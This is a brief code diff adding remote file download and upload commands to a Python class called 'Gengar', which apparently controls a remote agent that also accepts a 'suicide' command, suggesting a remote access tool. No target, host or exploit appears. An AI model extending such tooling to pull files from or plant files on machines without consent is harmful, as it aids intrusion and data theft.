@@ -18,6 +18,16 @@ class Gengar:
         self._send(payload)
         return self._recv()
 
+    def download(self, remote_path, local_path):
+        payload = json.dumps(dict(cmd='download', path=remote_path))
+        self._send(payload)
+        with open(local_path, 'wb') as _file:
+            _file.write(self._recv().encode())
+
+    def upload(self, local_path, remote_path):
+        payload = json.dumps(dict(cmd='upload', path=remote_path, data=open(local_path, 'rb').read().decode()))
+        self._send(payload)
+
     def suicide(self):
         payload = json.dumps(dict(cmd='suicide'))
         self._send(payload)
